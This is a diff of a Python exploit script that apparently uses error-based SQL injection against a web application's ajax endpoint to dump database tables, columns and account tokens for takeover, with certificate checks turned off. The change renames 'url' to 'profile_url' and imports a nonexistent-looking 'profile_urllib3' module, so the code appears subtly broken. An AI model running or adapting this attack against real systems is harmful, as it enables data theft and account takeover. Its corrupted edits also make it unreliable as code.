@@ -5,8 +5,8 @@
 import requests
 import random
 from colorama import init, Fore
-import urllib3
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+import profile_urllib3
+profile_urllib3.disable_warnings(profile_urllib3.exceptions.InsecureRequestWarning)
 
 init()
 
@@ -47,7 +47,7 @@ class exploit:
             new_file.write(self.columns[i] + "\n")
         new_file.close()
 
-    def get_tables(self, url):
+    def get_tables(self, profile_url):
         print("\n" + blue + self.divider + "\n" + red + "DUMPING TABLES" + "\n" + blue + self.divider)
         i = 0
         while True:
@@ -61,7 +61,7 @@ class exploit:
                 "login-cookie": '', 
                 "language": "false"
             }
-            response = requests.post(url, headers=headers, cookies=self.cookies, data=data, verify=False)
+            response = requests.post(profile_url, headers=headers, cookies=self.cookies, data=data, verify=False)
             response = response.text
             response = response.replace('"error","db-error","sb_db_get","Malformed GTID set specification', '')
             response = response.replace('[', '')
@@ -78,7 +78,7 @@ class exploit:
                 break
         print("Tables Found " + white + str(self.tables))
 
-    def get_columns(self, url):
+    def get_columns(self, profile_url):
         lines = 0
         c = 1
         i = 0
@@ -95,7 +95,7 @@ class exploit:
                     "login-cookie": '', 
                     "language": "false"
                 }
-                response = requests.post(url, headers=headers, cookies=self.cookies, data=data, verify=False)
+                response = requests.post(profile_url, headers=headers, cookies=self.cookies, data=data, verify=False)
                 response = response.text
                 response = response.replace('"error","db-error","sb_db_get","Malformed GTID set specification', '')
                 response = response.replace('[', '')
@@ -118,9 +118,9 @@ class exploit:
                     break
             break
 
-    def get_tokens(self, url, path):
+    def get_tokens(self, profile_url, path):
         final_path = path.replace("admin.php", "include/ajax.php")
-        final_url = "{0}{1}".format(url, final_path)
+        final_profile_url = "{0}{1}".format(profile_url, final_path)
         print("\n" + blue + self.divider + "\n" + red + "Dumping Tokens For Account TakeOver" + "\n" + blue + self.divider)
         i = 0
         for i in range(0, 1):
@@ -134,7 +134,7 @@ class exploit:
                 "login-cookie": '', 
                 "language": "false"
             }
-            response = requests.post(final_url, headers=headers, cookies=self.cookies, data=data, verify=False)
+            response = requests.post(final_profile_url, headers=headers, cookies=self.cookies, data=data, verify=False)
             response = response.text
             response = response.replace('"error","db-error","sb_db_get","Malformed GTID set specification', '')
             response = response.replace('testtesttesttest', '')
@@ -157,7 +157,7 @@ class exploit:
                 "login-cookie": '', 
                 "language": "false"
             }
-            response = requests.post(final_url, headers=headers, cookies=self.cookies, data=data, verify=False)
+            response = requests.post(final_profile_url, headers=headers, cookies=self.cookies, data=data, verify=False)
             response = response.text
             response = response.replace('"error","db-error","sb_db_get","Malformed GTID set specification', '')
             response = response.replace('[', '')
